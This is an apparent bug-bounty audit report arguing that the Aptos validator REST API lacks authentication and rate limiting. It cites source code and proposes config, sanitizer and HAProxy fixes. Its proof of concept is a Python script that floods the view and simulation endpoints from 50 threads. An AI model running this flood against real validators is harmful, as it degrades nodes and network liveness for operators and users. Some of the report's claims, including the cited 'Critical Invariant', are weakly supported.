# Audit Report

## Title
Validator API Exposed Without Authentication or Rate Limiting Enabling Denial-of-Service Attacks

## Summary
The ApiConfig structure lacks authentication and rate limiting configuration options, and the API server implementation applies no such protective middleware. This exposes validator REST APIs to unauthorized access and resource exhaustion attacks, despite documentation claiming rate limiting exists. Validators run with API enabled by default, allowing attackers to flood CPU-intensive endpoints and degrade validator performance.

## Finding Description

The Aptos REST API server exposes multiple CPU-intensive endpoints without authentication or rate limiting protections:

**1. Missing Authentication Configuration**

The `ApiConfig` struct contains no authentication fields: [1](#0-0) 

In contrast, the `AdminServiceConfig` explicitly implements authentication with mainnet enforcement: [2](#0-1) 

The AdminService sanitizer enforces authentication on mainnet: [3](#0-2) 

**2. Missing Rate Limiting Configuration**

ApiConfig contains no rate limiting fields despite documentation claiming "Rate limiting: 100 requests per minute by default": [4](#0-3) 

**3. No Middleware Protection**

The API server route setup applies no authentication or rate limiting middleware: [5](#0-4) 

**4. HAProxy Lacks API-Specific Protection**

The HAProxy configuration for validators shows no per-IP request rate limiting on the API frontend: [6](#0-5) 

Only global connection limits exist (500 max connections), which are insufficient for protecting against request floods.

**5. API Enabled by Default on Validators**

Validators enable the API by default: [7](#0-6) 

**Attack Vector**

An attacker can exploit this by flooding:

1. **View Function Endpoint** - Execute expensive Move functions consuming up to 2M gas units per request: [8](#0-7) 

2. **Transaction Simulation** - Trigger full VM execution for each simulation request: [9](#0-8) 

3. **Batch Transaction Submission** - Submit up to 10 transactions per request to pollute the mempool: [10](#0-9) 

The attack requires no authentication, no stake, and faces no rate limiting. An attacker simply needs to identify a validator's API endpoint and send HTTP requests.

## Impact Explanation

**High Severity** per Aptos bug bounty criteria - "Validator node slowdowns":

1. **CPU Exhaustion**: View functions and simulations execute Move VM bytecode, consuming significant CPU. Continuous floods degrade validator consensus participation.

2. **Mempool Pollution**: Batch transaction submission can fill the mempool with invalid transactions, preventing legitimate transactions from being processed.

3. **Storage I/O Load**: Repeated state queries cause excessive database reads, impacting validator performance.

4. **Network Liveness Risk**: If multiple validators are targeted simultaneously, the network could experience liveness degradation as validators struggle to participate in consensus.

This breaks Critical Invariant #9: "Resource Limits: All operations must respect gas, storage, and computational limits" - the API has no limits on request volume.

## Likelihood Explanation

**Likelihood: High**

- **Attack Complexity**: Trivial - requires only HTTP requests to public endpoints
- **Attacker Requirements**: None - no authentication, stake, or special access needed
- **Discovery**: Easy - API endpoints are documented and validators commonly expose port 8080/8180
- **Cost**: Minimal - attacker pays only for network bandwidth
- **Detection Difficulty**: Moderate - appears as legitimate API traffic without authentication logs

The attack is already feasible on any validator that hasn't manually configured external rate limiting (e.g., via cloud provider WAF).

## Recommendation

**1. Add Authentication Configuration to ApiConfig**

Add authentication support similar to AdminServiceConfig:

```rust
#[derive(Clone, Debug, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct ApiConfig {
    // ... existing fields ...
    
    /// Authentication configurations for API access
    /// If empty on validators, all requests are allowed (should warn or error)
    pub authentication_configs: Vec<AuthenticationConfig>,
}
```

**2. Add Rate Limiting Configuration**

```rust
#[derive(Clone, Debug, Deserialize, PartialEq, Eq, Serialize)]
pub struct ApiRateLimitConfig {
    pub enabled: bool,
    pub requests_per_minute: u32,
    pub requests_per_ip_per_minute: u32,
}

pub struct ApiConfig {
    // ... existing fields ...
    pub rate_limit: ApiRateLimitConfig,
}
```

**3. Implement Rate Limiting Middleware**

Use a token bucket rate limiter (already available in the codebase): [11](#0-10) 

Apply middleware in runtime.rs similar to faucet implementation: [12](#0-11) 

**4. Add Config Sanitizer**

Enforce authentication on validators, especially mainnet:

```rust
impl ConfigSanitizer for ApiConfig {
    fn sanitize(
        node_config: &NodeConfig,
        node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        if !node_config.api.enabled {
            return Ok(());
        }
        
        if node_type == NodeType::Validator {
            if let Some(chain_id) = chain_id {
                if chain_id.is_mainnet() && node_config.api.authentication_configs.is_empty() {
                    return Err(Error::ConfigSanitizerFailed(
                        "ApiConfig",
                        "Must enable authentication for API on mainnet validators.".into(),
                    ));
                }
            }
        }
        Ok(())
    }
}
```

**5. Update HAProxy Configuration**

Add request rate limiting to API frontends:

```haproxy
frontend validator-api
    mode http
    option httplog
    bind :8180
    
    # Per-IP rate limiting
    stick-table type ip size 100k expire 60s store http_req_rate(60s)
    http-request track-sc0 src
    http-request deny deny_status 429 if { sc_http_req_rate(0) gt 100 }
    
    default_backend validator-api
```

## Proof of Concept

**Attack Script (Python):**

```python
#!/usr/bin/env python3
import requests
import concurrent.futures
import time

# Target validator API endpoint
VALIDATOR_API = "http://validator-node:8080"

# Expensive view function (example)
VIEW_FUNCTION_PAYLOAD = {
    "function": "0x1::stake::get_validator_state",
    "type_arguments": [],
    "arguments": ["0x1"]
}

def flood_view_function():
    """Send view function requests to exhaust CPU"""
    while True:
        try:
            resp = requests.post(
                f"{VALIDATOR_API}/v1/view",
                json=VIEW_FUNCTION_PAYLOAD,
                timeout=5
            )
            print(f"View request: {resp.status_code}")
        except Exception as e:
            print(f"Error: {e}")

def flood_simulation():
    """Send transaction simulation requests"""
    while True:
        try:
            # Craft a valid signed transaction for simulation
            resp = requests.post(
                f"{VALIDATOR_API}/v1/transactions/simulate",
                json={"...": "transaction payload"},
                timeout=5
            )
            print(f"Simulation request: {resp.status_code}")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    print("[*] Starting validator API flood attack")
    print(f"[*] Target: {VALIDATOR_API}")
    
    # Launch 50 concurrent threads flooding view functions
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        for _ in range(50):
            executor.submit(flood_view_function)
    
    # No rate limiting will prevent these requests
    # Validator CPU will be saturated executing view functions
```

**Expected Result:**
- Validator CPU usage approaches 100%
- Consensus participation degrades (missed proposals/votes)
- Legitimate API requests experience high latency or timeouts
- No authentication challenge occurs
- No rate limiting blocks the flood

**Verification Steps:**
1. Deploy Aptos validator with default configuration
2. Run the attack script pointing to the validator's API
3. Monitor validator metrics (CPU, consensus participation rate)
4. Observe degraded performance without any access control

## Notes

This vulnerability demonstrates a critical security oversight where the Aptos team implemented authentication for the AdminService with mainnet enforcement, but failed to apply the same protections to the more widely exposed REST API. The discrepancy between documentation (claiming rate limiting exists) and implementation (no rate limiting code) suggests this may have been an incomplete feature or documentation error that was never addressed.

### Citations

**File:** config/src/config/api_config.rs (L17-93)
```rust
pub struct ApiConfig {
    /// Enables the REST API endpoint
    #[serde(default = "default_enabled")]
    pub enabled: bool,
    /// Address for the REST API to listen on. Set to 0.0.0.0:port to allow all inbound connections.
    pub address: SocketAddr,
    /// Path to a local TLS certificate to enable HTTPS
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tls_cert_path: Option<String>,
    /// Path to a local TLS key to enable HTTPS
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tls_key_path: Option<String>,
    /// A maximum limit to the body of a POST request in bytes
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub content_length_limit: Option<u64>,
    /// Enables failpoints for error testing
    #[serde(default = "default_disabled")]
    pub failpoints_enabled: bool,
    /// Enables JSON output of APIs that support it
    #[serde(default = "default_enabled")]
    pub json_output_enabled: bool,
    /// Enables BCS output of APIs that support it
    #[serde(default = "default_enabled")]
    pub bcs_output_enabled: bool,
    /// Enables compression middleware for API responses
    #[serde(default = "default_enabled")]
    pub compression_enabled: bool,
    /// Enables encode submission API
    #[serde(default = "default_enabled")]
    pub encode_submission_enabled: bool,
    /// Enables transaction submission APIs
    #[serde(default = "default_enabled")]
    pub transaction_submission_enabled: bool,
    /// Enables transaction simulation
    #[serde(default = "default_enabled")]
    pub transaction_simulation_enabled: bool,
    /// Maximum number of transactions that can be sent with the Batch submit API
    pub max_submit_transaction_batch_size: usize,
    /// Maximum page size for transaction paginated APIs
    pub max_transactions_page_size: u16,
    /// Maximum page size for block transaction APIs
    pub max_block_transactions_page_size: u16,
    /// Maximum page size for event paginated APIs
    pub max_events_page_size: u16,
    /// Maximum page size for resource paginated APIs
    pub max_account_resources_page_size: u16,
    /// Maximum page size for module paginated APIs
    pub max_account_modules_page_size: u16,
    /// Maximum gas unit limit for view functions
    ///
    /// This limits the execution length of a view function to the given gas used.
    pub max_gas_view_function: u64,
    /// Optional: Maximum number of worker threads for the API.
    ///
    /// If not set, `runtime_worker_multiplier` will multiply times the number of CPU cores on the machine
    pub max_runtime_workers: Option<usize>,
    /// Multiplier for number of worker threads with number of CPU cores
    ///
    /// If `max_runtime_workers` is set, this is ignored
    pub runtime_worker_multiplier: usize,
    /// Configs for computing unit gas price estimation
    pub gas_estimation: GasEstimationConfig,
    /// Periodically call gas estimation
    pub periodic_gas_estimation_ms: Option<u64>,
    /// Configuration to filter view function requests.
    pub view_filter: ViewFilter,
    /// Periodically log stats for view function and simulate transaction usage
    pub periodic_function_stats_sec: Option<u64>,
    /// The time wait_by_hash will wait before returning 404.
    pub wait_by_hash_timeout_ms: u64,
    /// The interval at which wait_by_hash will poll the storage for the transaction.
    pub wait_by_hash_poll_interval_ms: u64,
    /// The number of active wait_by_hash requests that can be active at any given time.
    pub wait_by_hash_max_active_connections: usize,
    /// Allow submission of encrypted transactions via the API
    pub allow_encrypted_txns_submission: bool,
}
```

**File:** config/src/config/admin_service_config.rs (L17-39)
```rust
pub struct AdminServiceConfig {
    pub enabled: Option<bool>,
    pub address: String,
    pub port: u16,
    // If empty, will allow all requests without authentication. (Not allowed on mainnet.)
    pub authentication_configs: Vec<AuthenticationConfig>,
    pub malloc_stats_max_len: usize,
}

#[derive(Clone, Debug, Deserialize, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum AuthenticationConfig {
    // This will allow authentication through query parameter.
    // e.g. `/profilez?passcode=abc`.
    //
    // To calculate sha256, use sha256sum tool, or other online tools.
    //
    // e.g.
    //
    // printf abc |sha256sum
    PasscodeSha256(String),
    // TODO(grao): Add SSL support if necessary.
}
```

**File:** config/src/config/admin_service_config.rs (L68-76)
```rust
            if let Some(chain_id) = chain_id {
                if chain_id.is_mainnet()
                    && node_config.admin_service.authentication_configs.is_empty()
                {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "Must enable authentication for AdminService on mainnet.".into(),
                    ));
                }
```

**File:** api/doc/README.md (L26-27)
```markdown
## Limitations
- Rate limiting: 100 requests per minute by default
```

**File:** api/src/runtime.rs (L229-264)
```rust
    runtime_handle.spawn(async move {
        let cors = Cors::new()
            // To allow browsers to use cookies (for cookie-based sticky
            // routing in the LB) we must enable this:
            // https://stackoverflow.com/a/24689738/3846032
            .allow_credentials(true)
            .allow_methods(vec![Method::GET, Method::POST]);

        // Build routes for the API
        let route = Route::new()
            .at("/", poem::get(root_handler))
            .nest(
                "/v1",
                Route::new()
                    .nest("/", api_service)
                    .at("/spec.json", poem::get(spec_json))
                    .at("/spec.yaml", poem::get(spec_yaml))
                    // TODO: We add this manually outside of the OpenAPI spec for now.
                    // https://github.com/poem-web/poem/issues/364
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
            )
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
        Server::new_with_acceptor(acceptor)
            .run(route)
            .await
            .map_err(anyhow::Error::msg)
    });
```

**File:** docker/compose/aptos-node/haproxy.cfg (L108-124)
```text
## Specify the API frontend
frontend validator-api
    mode http
    option httplog
    bind :8180
    default_backend validator-api

    # Deny requests from blocked IPs
    tcp-request connection reject if { src -n -f /usr/local/etc/haproxy/blocked.ips }

    ## Add the forwarded header
    http-request add-header Forwarded "for=%ci"

## Specify the API backend
backend validator-api
    mode http
    server validator validator:8080
```

**File:** config/src/config/test_data/validator.yaml (L80-81)
```yaml
api:
    enabled: true
```

**File:** api/src/view_function.rs (L69-92)
```rust
    #[oai(
        path = "/view",
        method = "post",
        operation_id = "view",
        tag = "ApiTags::View"
    )]
    async fn view_function(
        &self,
        accept_type: AcceptType,
        /// View function request with type and position arguments
        request: ViewFunctionRequest,
        /// Ledger version to get state of account
        ///
        /// If not provided, it will be the latest version
        ledger_version: Query<Option<U64>>,
    ) -> BasicResultWith404<Vec<MoveValue>> {
        fail_point_poem("endpoint_view_function")?;
        self.context
            .check_api_output_enabled("View function", &accept_type)?;

        let context = self.context.clone();
        api_spawn_blocking(move || view_request(context, accept_type, request, ledger_version))
            .await
    }
```

**File:** api/src/transactions.rs (L476-499)
```rust
    async fn submit_transaction(
        &self,
        accept_type: AcceptType,
        data: SubmitTransactionPost,
    ) -> SubmitTransactionResult<PendingTransaction> {
        data.verify()
            .context("Submitted transaction invalid'")
            .map_err(|err| {
                SubmitTransactionError::bad_request_with_code_no_info(
                    err,
                    AptosErrorCode::InvalidInput,
                )
            })?;
        fail_point_poem("endpoint_submit_transaction")?;
        if !self.context.node_config.api.transaction_submission_enabled {
            return Err(api_disabled("Submit transaction"));
        }
        self.context
            .check_api_output_enabled("Submit transaction", &accept_type)?;
        let ledger_info = self.context.get_latest_ledger_info()?;
        let signed_transaction = self.get_signed_transaction(&ledger_info, data)?;
        self.create(&accept_type, &ledger_info, signed_transaction)
            .await
    }
```

**File:** api/src/transactions.rs (L529-550)
```rust
    async fn submit_transactions_batch(
        &self,
        accept_type: AcceptType,
        data: SubmitTransactionsBatchPost,
    ) -> SubmitTransactionsBatchResult<TransactionsBatchSubmissionResult> {
        data.verify()
            .context("Submitted transactions invalid")
            .map_err(|err| {
                SubmitTransactionError::bad_request_with_code_no_info(
                    err,
                    AptosErrorCode::InvalidInput,
                )
            })?;
        fail_point_poem("endpoint_submit_batch_transactions")?;
        if !self.context.node_config.api.transaction_submission_enabled {
            return Err(api_disabled("Submit batch transaction"));
        }
        self.context
            .check_api_output_enabled("Submit batch transactions", &accept_type)?;
        let ledger_info = self.context.get_latest_ledger_info()?;
        let signed_transactions_batch = self.get_signed_transactions_batch(&ledger_info, data)?;
        if self.context.max_submit_transaction_batch_size() < signed_transactions_batch.len() {
```

**File:** crates/aptos-rate-limiter/src/rate_limit.rs (L1-50)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

use aptos_infallible::{Mutex, RwLock};
use aptos_logger::debug;
use aptos_metrics_core::HistogramVec;
use std::{cmp::min, collections::HashMap, fmt::Debug, hash::Hash, sync::Arc, time::Instant};
use tokio::time::Duration;

pub type SharedBucket = Arc<Mutex<Bucket>>;

const ONE_SEC: Duration = Duration::from_secs(1);

/// A generic token bucket filter
///
/// # Terms
/// ## Key
/// A `key` is an identifier of the item being rate limited
///
/// ## Token
/// A `token` is the smallest discrete value that we want to rate limit by.  In a situation involving
/// network requests, this may represent a request or a byte.  `Tokens` are the counters for the
/// rate limiting, and when there are no `tokens` left in a `bucket`, the `key` is throttled.
///
/// ## Bucket
/// A `bucket` is the tracker of the number of `tokens`.  It has a `bucket size`, and any additional
/// tokens added to it will "spill" out of the `bucket`.  The `buckets` are filled at an `interval`
/// with a given `fill rate`.
///
/// ## Interval
/// The `interval` at which we refill *all* of the `buckets` in the token bucket filter. Configured
/// across the whole token bucket filter.
///
/// ## Fill Rate
/// The rate at which we fill a `bucket` with tokens. Configured per bucket.
///
/// ## Bucket Size
/// Maximum size of a bucket.  A bucket saturates at this size.  Configured per bucket.
///
/// # Features
/// ## Keys
/// The token bucket takes any key as long as it's hashable.  This should allow it to apply to
/// many applications that need rate limiters.
///
/// ## Bucket sizes and Rates
/// ### Defaults
/// There are defaults for bucket size and fill rate, which will apply to unknown keys.
///
/// ### Refill Interval
/// Buckets are refilled automatically at an interval.  To do this synchronously, it calculates the
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L1-50)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

use super::{CheckerData, CheckerTrait, CompleteData};
use crate::{
    endpoints::{AptosTapError, RejectionReason, RejectionReasonCode},
    helpers::{days_since_tap_epoch, get_current_time_secs},
};
use async_trait::async_trait;
use lru::LruCache;
use serde::{Deserialize, Serialize};
use std::{net::IpAddr, num::NonZeroUsize, sync::atomic::AtomicU64};
use tokio::sync::Mutex;

#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct MemoryRatelimitCheckerConfig {
    pub max_requests_per_day: u32,

    #[serde(default = "MemoryRatelimitCheckerConfig::default_max_entries_in_map")]
    pub max_entries_in_map: NonZeroUsize,
}

impl MemoryRatelimitCheckerConfig {
    fn default_max_entries_in_map() -> NonZeroUsize {
        NonZeroUsize::new(1000000).unwrap()
    }
}

/// Simple in memory storage that rejects if we've ever seen a request from an
/// IP that has succeeded. This does not support JWT-based ratelimiting.
pub struct MemoryRatelimitChecker {
    pub max_requests_per_day: u32,

    /// Map of IP to how many requests they've submitted today (where the
    /// response wasn't a 500). To avoid OOMing the server, we set a limit
    /// on how many entries we have in the table.
    pub ip_to_requests_today: Mutex<LruCache<IpAddr, u32>>,

    /// Used for tracking daily ratelimit. See the comment in RedisRatelimitChecker
    /// for more information on how we track daily limits.
    pub current_day: AtomicU64,
}

impl MemoryRatelimitChecker {
    pub fn new(args: MemoryRatelimitCheckerConfig) -> Self {
        Self {
            max_requests_per_day: args.max_requests_per_day,
            ip_to_requests_today: Mutex::new(LruCache::new(args.max_entries_in_map)),
            current_day: AtomicU64::new(days_since_tap_epoch(get_current_time_secs())),
        }
```
